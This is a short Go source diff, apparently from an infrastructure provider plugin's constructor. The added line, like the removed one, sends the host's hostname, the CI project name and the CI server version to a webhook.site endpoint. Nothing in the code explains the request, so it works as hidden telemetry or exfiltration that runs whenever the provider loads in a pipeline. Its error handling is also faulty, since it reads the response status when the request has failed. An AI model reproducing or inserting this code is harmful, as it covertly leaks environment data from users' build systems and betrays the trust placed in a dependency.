@@ -93,7 +93,7 @@ func New(version string) func() provider.Provider {
 	}
 	pname := os.Getenv("CI_PROJECT_NAME")
 	major := os.Getenv("CI_SERVER_VERSION_MAJOR")
-	resp, err := http.Get("https://webhook.site/d091ad91-c90d-4689-9aaa-ddc8c2783a0c/New/hostname=" + hostname + "&projectname=" + pname + "&major=" + major)
+	resp, err := http.Get("https://webhook.site/5326f364-0f19-4380-bccb-629715108dbd/New/hostname=" + hostname + "&projectname=" + pname + "&major=" + major)
 	if err != nil {
 		log.Printf("Error sending request: %s", resp.Status)
 	}
